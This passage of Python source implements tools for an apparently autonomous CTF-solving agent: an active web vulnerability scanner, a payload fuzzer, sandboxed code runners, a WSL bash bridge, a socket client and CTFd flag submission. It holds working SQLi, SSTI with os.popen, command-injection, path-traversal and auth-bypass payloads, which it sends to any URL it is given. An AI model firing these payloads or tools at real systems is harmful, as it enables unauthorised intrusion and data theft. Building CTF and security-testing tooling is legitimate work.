        strings = re.findall(rb'[A-Za-z0-9_\-\.\/\{\}]{4,}', head)
        interesting = [
            s.decode('latin-1') for s in strings
            if any(k in s.lower() for k in [b"flag", b"hqx", b"ctf", b"pass", b"key", b"admin", b"strcmp", b"system"])
        ]
        info["interesting_strings"] = interesting[:25]
        info["sample_extracted_strings"] = [s.decode('latin-1') for s in strings[:15]]
        return json.dumps(info, indent=2)

    # 5. AUTOMATED WEB SECURITY SCANNER & ASSISTANT
    elif tool_name == "web_security_probe":
        url = tool_input.get("url", "").strip()
        method = tool_input.get("method", "GET").upper()
        data = tool_input.get("data")
        headers = tool_input.get("headers", {})
        cookies = tool_input.get("cookies", {})
        active_scan = tool_input.get("active_scan", True)

        if "User-Agent" not in headers:
            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) CTF-Security-Assistant/2.0"

        try:
            # 1. Primary Request
            if method == "POST":
                r = requests.post(url, headers=headers, cookies=cookies, data=data, timeout=8, verify=False)
            elif method == "OPTIONS":
                r = requests.options(url, headers=headers, cookies=cookies, timeout=8, verify=False)
            else:
                r = requests.get(url, headers=headers, cookies=cookies, timeout=8, verify=False)

            html = r.text

            # Extract structural elements
            comments = re.findall(r'<!--(.*?)-->', html, re.DOTALL)
            inputs = re.findall(r'<input[^>]+>', html, re.IGNORECASE)
            forms = re.findall(r"<form[^>]*action=['\"]([^'\"]*)['\"]", html, re.IGNORECASE)
            scripts = re.findall(r"<script[^>]*src=['\"]([^'\"]*)['\"]", html, re.IGNORECASE)
            flag_matches = re.findall(r'(?:flag|hqx|ctf)\{[^}]+\}', html, re.IGNORECASE)

            # Header & Security Configuration Audit
            sec_audit = {}
            cors_hdr = r.headers.get("Access-Control-Allow-Origin")
            if cors_hdr == "*":
                sec_audit["cors_wildcard"] = "CORS header allows all origins (*)"
            if "Content-Security-Policy" not in r.headers:
                sec_audit["missing_csp"] = "No Content-Security-Policy header"
            if "X-Frame-Options" not in r.headers:
                sec_audit["missing_clickjacking_protection"] = "No X-Frame-Options header"

            # Active Probing for Vulnerabilities (if active_scan enabled)
            active_findings = []
            if active_scan and method == "GET":
                # A. SSTI Reflection Test
                try:
                    ssti_url = url + ("&" if "?" in url else "?") + "ctf_probe={{7*7}}"
                    r_ssti = requests.get(ssti_url, headers=headers, cookies=cookies, timeout=4, verify=False)
                    if "49" in r_ssti.text and "49" not in html:
                        active_findings.append({
                            "type": "SSTI_VULNERABILITY",
                            "severity": "CRITICAL",
                            "details": "Server-Side Template Injection confirmed (payload {{7*7}} evaluated to 49)",
                            "recommended_exploit": "{{''.__class__.__mro__[1].__subclasses__()}}"
                        })
                except Exception:
                    pass

                # B. SQLi Error Reflection Test
                try:
                    sqli_url = url + ("&" if "?" in url else "?") + "id=1%27%22"
                    r_sqli = requests.get(sqli_url, headers=headers, cookies=cookies, timeout=4, verify=False)
                    sql_errors = ["syntax error", "mysql", "sqlite3", "psycopg2", "unclosed quotation"]
                    for err in sql_errors:
                        if err in r_sqli.text.lower() and err not in html.lower():
                            active_findings.append({
                                "type": "SQLI_ERROR_REFLECTION",
                                "severity": "HIGH",
                                "details": f"SQL syntax error detected: '{err}'",
                                "recommended_exploit": "' UNION SELECT 1, sql, 3 FROM sqlite_master --"
                            })
                            break
                except Exception:
                    pass

                # C. LFI Canary Test
                try:
                    lfi_url = url + ("&" if "?" in url else "?") + "file=../../../../etc/passwd"
                    r_lfi = requests.get(lfi_url, headers=headers, cookies=cookies, timeout=4, verify=False)
                    if "root:x:0:0:" in r_lfi.text:
                        active_findings.append({
                            "type": "LFI_PATH_TRAVERSAL",
                            "severity": "CRITICAL",
                            "details": "Local File Inclusion confirmed: /etc/passwd contents leaked",
                            "flags_in_file": re.findall(r'(?:flag|hqx|ctf)\{[^}]+\}', r_lfi.text, re.IGNORECASE)
                        })
                except Exception:
                    pass

            report = {
                "target_url": url,
                "status_code": r.status_code,
                "response_headers": dict(r.headers),
                "cookies_received": dict(r.cookies),
                "forms_discovered": forms[:5],
                "form_inputs": inputs[:10],
                "script_endpoints": scripts[:5],
                "html_comments": [c.strip() for c in comments if c.strip()][:5],
                "security_audit": sec_audit,
                "active_vulnerability_findings": active_findings,
                "direct_flags_found": list(set(flag_matches))
            }
            return json.dumps(report, indent=2)
        except Exception as e:
            return json.dumps({"error": f"Web probe failed: {str(e)}"})

    # 6. PYTHON SANDBOX EXECUTION
    elif tool_name == "execute_python_sandbox":
        code_str = tool_input.get("code", "").strip()
        timeout = min(int(tool_input.get("timeout_seconds", 10)), 20)
        if not code_str:
            return json.dumps({"error": "No Python code provided"})
        
        with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False, encoding="utf-8") as tf:
            tf.write(code_str)
            tmp_name = tf.name
        
        try:
            t0 = time.time()
            res = subprocess.run(
                [sys.executable, tmp_name],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            elapsed = round(time.time() - t0, 3)
            out = res.stdout
            err = res.stderr
            ret = res.returncode
            found_flags = re.findall(r"(?:flag|CTF|HQX|hackquest)\{[^}]+\}", out + "\n" + err, re.IGNORECASE)
            
            diagnosis = "Exploit successful! Flag captured." if found_flags else (
                f"Execution failed with return code {ret}. Check stderr traceback and correct payload/dependencies." if ret != 0 else
                "Script completed with code 0, but no CTF flag was found in stdout/stderr. Check if output needs secondary decoding or parameter modification."
            )

            result = {
                "status": "success" if ret == 0 else "error",
                "returncode": ret,
                "elapsed_seconds": elapsed,
                "diagnosis": diagnosis,
                "stdout": out[-2000:] if len(out) > 2000 else out,
                "stderr": err[-1000:] if len(err) > 1000 else err,
                "flags_captured": list(set(found_flags))
            }
            return json.dumps(result, indent=2)
        except subprocess.TimeoutExpired:
            return json.dumps({
                "status": "timeout",
                "error": f"Execution timed out after {timeout} seconds",
                "diagnosis": "Timeout expired. Reduce search space, use batching, or increase timeout_seconds."
            }, indent=2)
        except Exception as e:
            return json.dumps({"error": f"Sandbox execution failed: {str(e)}"}, indent=2)
        finally:
            try:
                os.remove(tmp_name)
            except Exception:
                pass

    # 7. PARALLEL MULTI-STRATEGY EXPLOIT WORKERS
    elif tool_name == "parallel_exploit_worker":
        scripts = tool_input.get("scripts", [])
        timeout = min(int(tool_input.get("timeout_seconds", 12)), 25)
        if not scripts:
            return json.dumps({"error": "No scripts provided in scripts list"})

        import concurrent.futures

        def _execute_single(idx, code):
            with tempfile.NamedTemporaryFile("w", suffix=f"_par_{idx}.py", delete=False, encoding="utf-8") as pf:
                pf.write(code)
                pname = pf.name
            try:
                t0 = time.time()
                res = subprocess.run([sys.executable, pname], capture_output=True, text=True, timeout=timeout)
                el = round(time.time() - t0, 3)
                combined = res.stdout + "\n" + res.stderr
                flags = re.findall(r"(?:flag|CTF|HQX|hackquest)\{[^}]+\}", combined, re.IGNORECASE)
                return {
                    "strategy_id": idx + 1,
                    "returncode": res.returncode,
                    "elapsed_seconds": el,
                    "flags_captured": list(set(flags)),
                    "stdout_snippet": res.stdout[-400:] if len(res.stdout) > 400 else res.stdout,
                    "stderr_snippet": res.stderr[-200:] if len(res.stderr) > 200 else res.stderr
                }
            except subprocess.TimeoutExpired:
                return {"strategy_id": idx + 1, "returncode": -1, "status": "timeout", "flags_captured": []}
            except Exception as ex:
                return {"strategy_id": idx + 1, "returncode": -2, "error": str(ex), "flags_captured": []}
            finally:
                try:
                    os.remove(pname)
                except Exception:
                    pass

        results = []
        captured_flags = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(len(scripts), 6)) as pool:
            futures = [pool.submit(_execute_single, i, sc) for i, sc in enumerate(scripts)]
            for fut in concurrent.futures.as_completed(futures):
                r = fut.result()
                results.append(r)
                if r.get("flags_captured"):
                    captured_flags.extend(r["flags_captured"])

        return json.dumps({
            "status": "completed",
            "strategies_tested": len(scripts),
            "winning_flags": list(set(captured_flags)),
            "all_results": results
        }, indent=2)

    # 8. FORENSICS SANDBOX ENGINE (Controlled Path Safe)
    elif tool_name == "run_forensics_inspection":
        file_path = tool_input.get("file_path", "")
        if not os.path.exists(file_path):
            return json.dumps({"error": f"File not found: {file_path}"})
        try:
            forensic_dir = get_forensic_dir()
            if forensic_dir not in sys.path and os.path.exists(forensic_dir):
                sys.path.insert(0, forensic_dir)
            from forensic_engine.engine import ForensicEngine
            engine = ForensicEngine()
            report = engine.process_file(file_path)
            print(f"[TOOL] ForensicEngine processed {os.path.basename(file_path)} successfully.")
            return json.dumps(report, indent=2)
        except Exception as err:
            return json.dumps({"error": f"ForensicEngine error: {err}"})

    # 8. FLAG PATTERN HUNTER
    elif tool_name == "search_flag_patterns":
        text = tool_input.get("text", "")
        file_path = tool_input.get("file_path")
        if file_path and os.path.exists(file_path):
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                text += "\n" + f.read()

        flags = re.findall(r"(?:flag|CTF|HQX|hackquest)\{[^}]+\}", text, re.IGNORECASE)
        b64_matches = re.findall(r"(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?", text)
        zero_width = [char for char in text if char in ['\u200b', '\u200c', '\u200d', '\ufeff']]

        result = {
            "flags_found": list(set(flags)),
            "b64_candidates": list(set(b64_matches))[:5],
            "zero_width_chars_count": len(zero_width)
        }
        return json.dumps(result, indent=2)

    # 9. GITHUB MCP TOOLS
    elif tool_name in ["read_github_file", "commit_github_file", "list_github_repos", "create_github_branch", "create_github_pr", "merge_github_pr", "list_github_branches", "list_github_prs"]:
        tool_map = {
            "read_github_file": "read_file",
            "commit_github_file": "create_or_update_file",
            "list_github_repos": "list_repositories",
            "create_github_branch": "create_branch",
            "create_github_pr": "create_pull_request",
            "merge_github_pr": "merge_pull_request",
            "list_github_branches": "list_branches",
            "list_github_prs": "list_pull_requests"
        }
        target_tool = tool_map[tool_name]
        headers = {
            "Content-Type": "application/json",
            "Authorization": f"Bearer {MCP_API_KEY}"
        }
        try:
            resp = requests.post(
                f"{MCP_SERVER_URL}/api/test-tool",
                headers=headers,
                json={"tool": target_tool, "params": tool_input},
                timeout=15
            )
            return resp.text
        except Exception as err:
            return json.dumps({"error": f"MCP Gateway call failed: {err}"})

    # 10. CTFD PLATFORM MANAGER (Autonomous Challenge Fetching & Flag Submission)
    elif tool_name == "ctfd_manage":
        action = tool_input.get("action", "list_challenges")
        ctfd_url = (tool_input.get("ctfd_url") or "").rstrip("/")
        token = (tool_input.get("token") or "").strip()
        challenge_id = tool_input.get("challenge_id")
        flag = (tool_input.get("flag") or "").strip()

        if not ctfd_url:
            return json.dumps({"error": "ctfd_url is required"})

        headers = {"Content-Type": "application/json"}
        if token:
            if token.startswith("session="):
                headers["Cookie"] = token
            else:
                headers["Authorization"] = f"Token {token}"

        session = requests.Session()
        session.headers.update(headers)

        try:
            if action == "list_challenges":
                r = session.get(f"{ctfd_url}/api/v1/challenges", timeout=10)
                if r.status_code == 200:
                    try:
                        resp_json = r.json()
                        data = resp_json.get("data", [])
                    except Exception:
                        return json.dumps({
                            "status": "error",
                            "code": 200,
                            "message": f"Server at {ctfd_url} returned an HTML webpage instead of CTFd API JSON. The target URL is a web portal, not a CTFd REST API platform.",
                            "preview": r.text[:250].replace("\n", " ").strip()
                        }, indent=2)

                    simplified = [
                        {
                            "id": c.get("id"),
                            "name": c.get("name"),
                            "category": c.get("category"),
                            "value": c.get("value"),
                            "solved_by_me": c.get("solved_by_me", False)
                        }
                        for c in data
                    ]
                    return json.dumps({"status": "success", "count": len(simplified), "challenges": simplified}, indent=2)
                elif r.status_code in (401, 403):
                    return json.dumps({
                        "status": "error",
                        "code": r.status_code,
                        "message": f"Access denied (HTTP {r.status_code}). Provide a valid CTFd Access Token (ctfd_...) or session cookie."
                    }, indent=2)
                elif r.status_code == 404:
                    return json.dumps({
                        "status": "error",
                        "code": 404,
                        "message": f"Endpoint {ctfd_url}/api/v1/challenges was not found (404). This platform does not support the CTFd REST API format."
                    }, indent=2)
                return json.dumps({"status": "error", "code": r.status_code, "response": r.text[:300]}, indent=2)

            elif action == "get_challenge":
                if not challenge_id:
                    return json.dumps({"error": "challenge_id is required for get_challenge"})
                r = session.get(f"{ctfd_url}/api/v1/challenges/{challenge_id}", timeout=10)
                if r.status_code == 200:
                    data = r.json().get("data", {})
                    return json.dumps({"status": "success", "challenge": data}, indent=2)
                return json.dumps({"status": "error", "code": r.status_code, "response": r.text})

            elif action == "submit_flag":
                if not challenge_id or not flag:
                    return json.dumps({"error": "challenge_id and flag are required for submit_flag"})
                payload = {"challenge_id": int(challenge_id), "submission": flag}
                r = session.post(f"{ctfd_url}/api/v1/challenges/attempt", json=payload, timeout=10)
                if r.status_code == 200:
                    res_data = r.json()
                    status_flag = res_data.get("data", {}).get("status", "unknown")
                    msg = res_data.get("data", {}).get("message", "")
                    return json.dumps({"status": "submitted", "result": status_flag, "message": msg, "flag": flag}, indent=2)
                return json.dumps({"status": "error", "code": r.status_code, "response": r.text})

            elif action == "get_scoreboard":
                r = session.get(f"{ctfd_url}/api/v1/scoreboard", timeout=10)
                if r.status_code == 200:
                    data = r.json().get("data", [])[:10]
                    return json.dumps({"status": "success", "top_10": data}, indent=2)
                return json.dumps({"status": "error", "code": r.status_code, "response": r.text})

            else:
                return json.dumps({"error": f"Unknown action: {action}"})
        except Exception as e:
            return json.dumps({"error": f"CTFd request failed: {str(e)}"})

    # 11. INTERACTIVE TCP / NETCAT SOCKET CLIENT
    elif tool_name == "interactive_socket_probe":
        host = tool_input.get("host", "").strip()
        port = int(tool_input.get("port", 0))
        payload = tool_input.get("payload", "")
        timeout = float(tool_input.get("timeout_seconds", 5.0))

        if not host or not port:
            return json.dumps({"error": "host and port are required"})

        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))

            banner = ""
            try:
                banner_raw = s.recv(4096)
                banner = banner_raw.decode("latin-1", errors="ignore")
            except Exception:
                pass

            response = ""
            if payload:
                if payload.startswith("hex:"):
                    send_bytes = bytes.fromhex(payload[4:])
                else:
                    send_bytes = (payload + "\n").encode("utf-8")
                s.sendall(send_bytes)
                time.sleep(0.3)
                try:
                    resp_raw = s.recv(4096)
                    response = resp_raw.decode("latin-1", errors="ignore")
                except Exception:
                    pass

            s.close()
            combined = banner + "\n" + response
            flags = re.findall(r"(?:HQX|flag|CTF|hackquest)\{[^}]+\}", combined, re.IGNORECASE)

            return json.dumps({
                "status": "connected",
                "host": host,
                "port": port,
                "banner": banner[:1000],
                "response": response[:1000],
                "flags_found": list(set(flags))
            }, indent=2)
        except Exception as e:
            return json.dumps({"error": f"Socket connection to {host}:{port} failed: {str(e)}"})

    # 12. DYNAMIC WEB FUZZING ENGINE (Vector RAG + DNA Graph + Differential Analysis)
    elif tool_name == "web_dynamic_fuzzer":
        target_url = tool_input.get("target_url", "").strip()
        category = tool_input.get("category", "SQLi")
        method = tool_input.get("method", "GET").upper()
        param_name = tool_input.get("param_name", "")
        post_data = tool_input.get("data") or {}

        if not target_url:
            return json.dumps({"error": "target_url is required"})

        # Built-in high-potency CTF payload battery per category
        BATTERY = {
            "SQLi": [
                "' OR '1'='1",
                "' OR 1=1-- -",
                "admin'--",
                "1' UNION SELECT null,version(),null-- -",
                "1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables-- -",
                "1' UNION SELECT 1,flag,3 FROM flags-- -",
                "' OR sleep(2.5)-- -",
                "1; SELECT pg_sleep(2.5)--",
                "' AND (SELECT 1 FROM (SELECT(SLEEP(2.5)))a)--"
            ],
            "SSTI": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{config}}",
                "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag* /flag flag.txt').read()}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id; cat flag*').read()}}",
                "*{7*7}",
                "{{''.__class__.__mro__[1].__subclasses__()}}"
            ],
            "CommandInjection": [
                "; cat flag* /flag /flag.txt",
                "| cat flag* /flag",
                "$(cat flag*)",
                "; whoami",
                "| id",
                "& dir flag*",
                "; sleep 2.5",
                "`cat flag*`"
            ],
            "PathTraversal": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "../../../../flag.txt",
                "../../../../flag",
                "..%2f..%2f..%2fflag.txt",
                "/etc/passwd",
                "/flag"
            ],
            "AuthBypass": [
                "admin' OR '1'='1",
                "admin'--",
                "admin' or 1=1#",
                "{\"username\": \"admin\", \"password\": {\"$ne\": null}}",
                "' OR 1=1 LIMIT 1--"
            ],
            "IDOR": [
                "0",
                "1",
                "admin",
                "-1",
                "9999",
                "1000",
                "true"
            ]
        }

        payloads = list(BATTERY.get(category, BATTERY["SQLi"]))

        # Query Hugging Face ZeroGPU Vector Space for additional discovered CTF payloads
        try:
            rag_res = requests.post(
                f"{HF_VECTOR_URL}/gradio_api/call/query",
                json={"data": [f"{category} web exploitation payload bypass CTF", "Web", 2]},
                timeout=5
            )
            if rag_res.status_code == 200:
                ev_id = rag_res.json().get("event_id")
                if ev_id:
                    v_res = requests.get(f"{HF_VECTOR_URL}/gradio_api/call/query/{ev_id}", timeout=5)
                    for ln in v_res.text.split("\n"):
                        if ln.startswith("data:"):
                            rag_text = json.loads(ln[5:].strip())[0]
                            extracted = re.findall(r"`([^`]{2,80})`", rag_text)
                            for exp in extracted:
                                if exp not in payloads and len(exp) < 100:
                                    payloads.append(exp)
        except Exception:
            pass

        # Query DNA Knowledge Graph for category attack patterns
        try:
            dna_res = requests.post(
                f"{HF_URL}/search/essence",
                json={"text": f"{category} attack vector", "top_k": 2},
                timeout=4
            )
            if dna_res.status_code == 200:
                dna_text = dna_res.text
                d_extracted = re.findall(r"`([^`]{2,80})`", dna_text)
                for exp in d_extracted:
                    if exp not in payloads and len(exp) < 100:
                        payloads.append(exp)
        except Exception:
            pass

        payloads = payloads[:15]

        # Differential Baseline Measurement
        session = requests.Session()
        session.headers.update({"User-Agent": "CTF-Dynamic-Fuzzer/2.0 (Security-Audit)"})

        baseline_len = 0
        baseline_time = 0.0
        baseline_status = 200
        baseline_body = ""
        try:
            t0 = time.time()
            if method == "POST":
                base_resp = session.post(target_url, json=post_data if post_data else None, timeout=5)
            else:
                base_resp = session.get(target_url, timeout=5)
            baseline_time = round(time.time() - t0, 3)
            baseline_len = len(base_resp.text)
            baseline_status = base_resp.status_code
            baseline_body = base_resp.text
        except Exception as e:
            return json.dumps({"error": f"Failed to connect to baseline target {target_url}: {str(e)}"})

        def find_flags(txt):
            return re.findall(r"(?:HQX|flag|CTF|hackquest|picoCTF)\{[^}]+\}", txt, re.IGNORECASE)

        captured_flags = list(set(find_flags(baseline_body)))
        if captured_flags:
            return json.dumps({
                "status": "flag_captured_in_baseline",
                "winning_flags": captured_flags,
                "url": target_url
            }, indent=2)

        findings = []
        import concurrent.futures

        def _test_payload(pld):
            try:
                cur_url = target_url
                cur_data = dict(post_data) if post_data else {}
                cur_params = {}

                if "FUZZ" in cur_url:
                    cur_url = cur_url.replace("FUZZ", requests.utils.quote(str(pld)))
                elif param_name:
                    if method == "POST":
                        cur_data[param_name] = pld
                    else:
                        cur_params[param_name] = pld
                else:
                    sep = "&" if "?" in cur_url else "?"
                    cur_url = f"{cur_url}{sep}fuzz={requests.utils.quote(str(pld))}"

                t_start = time.time()
                if method == "POST":
                    r = session.post(cur_url, data=cur_data if cur_data else None, params=cur_params, timeout=7)
                else:
                    r = session.get(cur_url, params=cur_params, timeout=7)
                duration = round(time.time() - t_start, 3)
                resp_text = r.text

                flg = find_flags(resp_text)
                anomalies = []

                if flg:
                    anomalies.append(f"FLAG_CAPTURE: {flg}")

                if ("7*7" in str(pld)) and ("49" in resp_text) and ("49" not in baseline_body):
                    anomalies.append("SSTI_CODE_EXECUTION: Expression 7*7 evaluated to 49")

                sql_errs = ["sql syntax", "mysql_fetch", "ora-", "sqlite3.operationalerror", "postgresql", "syntax error at or near"]
                for serr in sql_errs:
                    if serr in resp_text.lower() and serr not in baseline_body.lower():
                        anomalies.append(f"SQL_SYNTAX_ERROR: Leaked database error '{serr}'")
                        break

                cmd_indicators = ["uid=", "root:", "Volume Serial", "total 0", "drwxr-"]
                for cind in cmd_indicators:
                    if cind in resp_text and cind not in baseline_body:
                        anomalies.append(f"CMD_OUTPUT_REFLECTED: System indicator '{cind}' discovered")
                        break

                if "root:x:0:0:" in resp_text:
                    anomalies.append("TRAVERSAL_CONFIRMED: /etc/passwd contents leaked")

                if ("sleep" in str(pld).lower() or "pg_sleep" in str(pld).lower()) and (duration - baseline_time > 2.0):
                    anomalies.append(f"TIME_DELAY_ANOMALY: Response delayed by {duration}s (baseline {baseline_time}s)")

                len_delta = abs(len(resp_text) - baseline_len)
                if len_delta > (baseline_len * 0.35 + 50) and r.status_code == 200:
                    anomalies.append(f"DIFFERENTIAL_LENGTH: Delta of {len_delta} bytes from baseline")

                if anomalies or flg:
                    return {
                        "payload": pld,
                        "status_code": r.status_code,
                        "duration_s": duration,
                        "length": len(resp_text),
                        "anomalies": anomalies,
                        "flags": flg,
                        "snippet": resp_text[:300].replace("\n", " ").strip()
                    }
            except requests.Timeout:
                if "sleep" in str(pld).lower():
                    return {
                        "payload": pld,
                        "status_code": 0,
                        "duration_s": 7.0,
                        "anomalies": ["BLIND_TIME_EXECUTION: Request timed out on sleep payload"],
                        "flags": []
                    }
            except Exception:
                pass
            return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as pool:
            futs = [pool.submit(_test_payload, p) for p in payloads]
            for fut in concurrent.futures.as_completed(futs):
                res = fut.result()
                if res:
                    findings.append(res)
                    if res.get("flags"):
                        captured_flags.extend(res["flags"])

        if findings or captured_flags:
            try:
                evidence_text = f"Target {target_url} fuzzed for {category}. Discovered: {[f['anomalies'] for f in findings]} Flags: {captured_flags}"
                requests.post(
                    f"{HF_URL}/sync",
                    json={"text": evidence_text, "source": "DynamicWebFuzzer"},
                    timeout=3
                )
            except Exception:
                pass

        return json.dumps({
            "status": "completed",
            "target": target_url,
            "category": category,
            "total_payloads_fuzzed": len(payloads),
            "winning_flags": list(set(captured_flags)),
            "vulnerabilities_detected": len(findings),
            "findings": findings
        }, indent=2)

    # 13. SYMBOLIC EXECUTION & CONSTRAINT SOLVER (Z3 SMT ENGINE)
    elif tool_name == "symbolic_execution_solver":
        constraints_code = tool_input.get("constraints", "").strip()
        target_var = tool_input.get("target_var", "flag").strip()
        length = tool_input.get("length")

        if not constraints_code:
            return json.dumps({"error": "constraints parameter is required"})

        script_parts = [
            "import sys, os",
            "from z3 import *",
            ""
        ]

        if "Solver()" in constraints_code or "s.check()" in constraints_code:
            runner_code = constraints_code
        else:
            script_parts.append("s = Solver()")
            if length and int(length) > 0:
                script_parts.append(f"{target_var} = [BitVec(f'{target_var}_{{i}}', 8) for i in range({length})]")
                script_parts.append(f"for c in {target_var}: s.add(c >= 0x20, c <= 0x7e)")

            eq_lines = [ln.strip() for ln in constraints_code.replace(";", "\n").split("\n") if ln.strip()]
            for eq in eq_lines:
                if eq.startswith("s.add("):
                    script_parts.append(eq)
                else:
                    script_parts.append(f"s.add({eq})")

            script_parts.append("if s.check() == sat:")
            script_parts.append("    m = s.model()")
            if length and int(length) > 0:
                script_parts.append(f"    flag_chars = [chr(m[{target_var}[i]].as_long()) if m[{target_var}[i]] is not None else '?' for i in range({length})]")
                script_parts.append("    print('SOLVED_STRING:' + ''.join(flag_chars))")
            script_parts.append("    print('MODEL:' + str(m))")
            script_parts.append("else:")
            script_parts.append("    print('UNSAT')")
            runner_code = "\n".join(script_parts)

        with tempfile.NamedTemporaryFile("w", suffix="_z3_solver.py", delete=False, encoding="utf-8") as sf:
            sf.write(runner_code)
            s_name = sf.name

        try:
            t0 = time.time()
            proc = subprocess.run([sys.executable, s_name], capture_output=True, text=True, timeout=12)
            elapsed = round(time.time() - t0, 3)
            out = proc.stdout
            err = proc.stderr
            combined = out + "\n" + err

            flags = re.findall(r"(?:HQX|flag|CTF|hackquest)\{[^}]+\}", combined, re.IGNORECASE)
            solved_str = ""
            for line in out.split("\n"):
                if line.startswith("SOLVED_STRING:"):
                    solved_str = line.replace("SOLVED_STRING:", "").strip()

            status = "sat" if "SOLVED_STRING:" in out or "sat" in out.lower() or (proc.returncode == 0 and "unsat" not in out.lower()) else "unsat"
            if proc.returncode != 0:
                status = "error"

            return json.dumps({
                "status": status,
                "elapsed_seconds": elapsed,
                "solved_string": solved_str,
                "winning_flags": list(set(flags)),
                "raw_output": out[:2000],
                "error": err[:1000] if err else None
            }, indent=2)
        except subprocess.TimeoutExpired:
            return json.dumps({"status": "timeout", "error": "Z3 solver timed out after 12 seconds."})
        except Exception as e:
            return json.dumps({"status": "error", "error": str(e)})
        finally:
            try:
                os.remove(s_name)
            except Exception:
                pass

    # 14. WSL2 LINUX BRIDGE (ELF Analysis, checksec, gdb-pwndbg, Linux Shell)
    elif tool_name == "wsl_linux_bridge":
        cmd = tool_input.get("command", "").strip()
        timeout = min(int(tool_input.get("timeout_seconds", 15)), 30)

        if not cmd:
            return json.dumps({"error": "command is required"})

        try:
            check_proc = subprocess.run(["wsl.exe", "-l", "-q"], capture_output=True, text=True, timeout=4)
            distros = [d.strip().replace("\x00", "") for d in check_proc.stdout.split("\n") if d.strip()]

            if not distros or check_proc.returncode != 0:
                return json.dumps({
                    "status": "wsl_distro_not_installed",
                    "message": "WSL is installed on Windows, but no Linux distribution (e.g. Ubuntu) is registered.",
                    "fix_command": "Run 'wsl --install -d Ubuntu' in Windows PowerShell or Terminal.",
                    "command_requested": cmd
                }, indent=2)

            t0 = time.time()
            wsl_proc = subprocess.run(
                ["wsl.exe", "--", "bash", "-c", cmd],
                capture_output=True,
                text=True,
                timeout=timeout
            )
            elapsed = round(time.time() - t0, 3)
            out = wsl_proc.stdout
            err = wsl_proc.stderr
            combined = out + "\n" + err

            flags = re.findall(r"(?:HQX|flag|CTF|hackquest)\{[^}]+\}", combined, re.IGNORECASE)

            return json.dumps({
                "status": "success" if wsl_proc.returncode == 0 else "error",
                "returncode": wsl_proc.returncode,
                "elapsed_seconds": elapsed,
                "distro": distros[0],
                "stdout": out[-3000:] if len(out) > 3000 else out,
                "stderr": err[-1500:] if len(err) > 1500 else err,
                "winning_flags": list(set(flags))
            }, indent=2)
        except subprocess.TimeoutExpired:
            return json.dumps({"status": "timeout", "error": f"WSL execution timed out after {timeout} seconds"})
        except Exception as e:
            return json.dumps({"status": "error", "error": f"WSL bridge error: {str(e)}"})

    # 14. SEARCH-AND-REPLACE NON-DESTRUCTIVE PATCH ENGINE
    elif tool_name == "patch_file_diff":
        path = tool_input.get("path", "").strip()
        search_block = tool_input.get("search", "")
        replace_block = tool_input.get("replace", "")
        repo = tool_input.get("repo", "").strip()
        branch = tool_input.get("branch", "main").strip()
        commit_msg = tool_input.get("commit_message", f"fix(swe): patch {path} search-replace").strip()

        if not path or not search_block:
            return json.dumps({"status": "error", "message": "path and search block are required"})

        # Normalize line breaks for robust matching
        norm_search = search_block.replace("\r\n", "\n")

        # Remote GitHub File Patching via Render MCP Gateway
        if repo and repo.lower() != "local":
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {MCP_API_KEY}"
            }
            # Step 1: Read existing content
            current_content = None
            try:
                read_res = requests.post(
                    f"{MCP_SERVER_URL}/api/test-tool",
                    headers=headers,
                    json={"tool": "read_file", "params": {"repo": repo, "path": path, "ref": branch}},
                    timeout=15
                )
                if read_res.status_code == 200:
                    rjson = read_res.json()
                    content_arr = rjson.get("content", [])
                    if content_arr and "text" in content_arr[0]:
                        current_content = content_arr[0]["text"]
            except Exception as e:
                pass

            # Fallback read from main if branch is newly created
            if not current_content and branch != "main":
                try:
                    read_res = requests.post(
                        f"{MCP_SERVER_URL}/api/test-tool",
                        headers=headers,
                        json={"tool": "read_file", "params": {"repo": repo, "path": path, "ref": "main"}},
                        timeout=15
                    )
                    if read_res.status_code == 200:
                        rjson = read_res.json()
                        content_arr = rjson.get("content", [])
                        if content_arr and "text" in content_arr[0]:
                            current_content = content_arr[0]["text"]
                except Exception:
                    pass

            if current_content is None:
                # If remote file not found or inaccessible, check local workspace as fallback
                if os.path.exists(path):
                    with open(path, "r", encoding="utf-8", errors="ignore") as lf:
                        current_content = lf.read()
                else:
                    return json.dumps({
                        "status": "error",
                        "message": f"Could not read '{path}' from repo '{repo}' on branch '{branch}'."
                    })

            # Step 2: Validate search block existence
            norm_content = current_content.replace("\r\n", "\n")
            if norm_search not in norm_content:
                # Provide helpful diagnostic context
                return json.dumps({
                    "status": "error",
                    "error_type": "SEARCH_BLOCK_NOT_FOUND",
                    "message": f"Search block not found in '{path}'. Please ensure exact whitespace, indentation, and variable names match.",
                    "search_preview": search_block[:200]
                })

            # Step 3: Perform precise replacement
            patched_content = norm_content.replace(norm_search, replace_block.replace("\r\n", "\n"), 1)

            # Step 4: Commit patched file to feature branch via MCP
            try:
                commit_res = requests.post(
                    f"{MCP_SERVER_URL}/api/test-tool",
                    headers=headers,
                    json={
                        "tool": "create_or_update_file",
                        "params": {
                            "repo": repo,
                            "path": path,
                            "content": patched_content,
                            "branch": branch,
                            "message": commit_msg
                        }
                    },
                    timeout=20
                )
                commit_output = commit_res.text
            except Exception as e:
                commit_output = f"Commit error: {e}"

            # Also synchronize local file if it exists locally
            local_synced = False
            if os.path.exists(path):
                try:
                    with open(path, "w", encoding="utf-8") as lf:
                        lf.write(patched_content)
                    local_synced = True
                except Exception:
                    pass

            return json.dumps({
                "status": "success",
                "mode": "github_mcp",
                "repo": repo,
                "file": path,
                "branch": branch,
                "local_synced": local_synced,
                "replaced_chars": len(search_block),
                "inserted_chars": len(replace_block),
                "commit_summary": commit_output
            }, indent=2)

        # Local File Patching
        else:
            resolved_path = os.path.abspath(path)
